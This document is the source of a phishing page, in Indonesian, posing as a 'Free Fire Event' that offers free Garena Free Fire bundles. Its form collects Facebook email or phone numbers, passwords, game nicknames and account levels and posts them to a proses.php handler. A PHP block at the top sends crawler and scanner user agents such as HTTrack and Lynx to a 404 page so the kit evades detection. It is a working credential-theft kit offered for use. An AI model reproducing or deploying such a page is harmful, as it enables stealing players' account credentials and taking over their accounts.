<?php 
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('http://idhaampedia.me/404.php');
die();
}
?>
<!DOCTYPE html>
<html>
<head>
    <noscript><H1><CENTER>IDHAAM69@CRAZYTYPER.INFO</CENTER></H1></noscript>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <title>FREE FIRE EVENT</title>
    <meta property="og:description" content="Get Free Bundle Garena Free Fire in Here !!">
    <meta property="og:image" content="">
    <link rel="shorcut icon" href="idhmxd/images/icon.png">
    <link rel="stylesheet" type="text/css" href="idhmxd/css/style.css">
    <link rel="stylesheet" type="text/css" href="idhmxd/css/animate.css">
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
    <script type="text/javascript" src="idhmxd/js/idhaampedia.js"></script>
</head>
<body>
	<div id="bg"></div>
	<div id="idhaampedia">
		<div class="animated slideInDown loginnya" style="max-width: 100%;">
			<div class="header" style="width: 80%; margin: 10px auto;">
				<img class="logo" src="idhmxd/images/logo-small.png" style="width: 150px;">
			</div>
            <form action="proses.php" method="POST">
                <img class="img-login" src="idhmxd/images/fb.png" alt="MiraiPedia" style="margin-top: 20px;">
                <input type="hidden" name="provider" value="fb">
                <input type="text" name="email" placeholder="Email atau Telepon" required autofocus>
                <input type="password" name="password" placeholder="Masukan Password" required>
                <input type="text" name="nick" placeholder="Masukan Nickname Akun Anda." required>
                <input type="number" name="lvl" placeholder="Masukan Level Akun" required>
                <select name="device" style="width: 83%;">
                    <option selected disabled>Pilih Device</option>
                    <option value="IOS">IOS</option>
                    <option value="Android">Android</option>
                </select>
                <select name="elite" id="elit" style="width: 83%;">
                    <option selected disabled>Pernah elite pass?</option>
                    <option value="y">Ya, Saya pernah</option>
                    <option value="g">Tidak</option>
                </select>
                <div id="haha" style="display: none;">
                    <input type="text" name="s" id="before" value="Season" readonly style="width: 39%; display: inline-block; margin-right: -1px;">
                    <input type="number" name="n" id="after" placeholder="Masukan angka season" style="width: 39%; display: inline-block; margin-left: -5px;">
                </div>
                <button class="btn-login" name="login" value="fb">Masuk</button>
            </div>
        </div>
	</div>
    <script type="text/javascript" src="idhmxd/js/antianti.js"></script>
	<script type="text/javascript">
        $('#elit').on('change', function() {
            if(this.value === "y") {
                $("#haha").show();
                $("#after").focus();
                $("#after").prop('required',true);
            } else if(this.value === "g") {
                $("#haha").hide();
                $('#after').val(''); 
                $("#after").prop('required',false); 
            } else {
                $("#haha").hide();
                $('#after').val(''); 
                $("#after").prop('required',false);
            }
        });
    </script>
</body>
</html>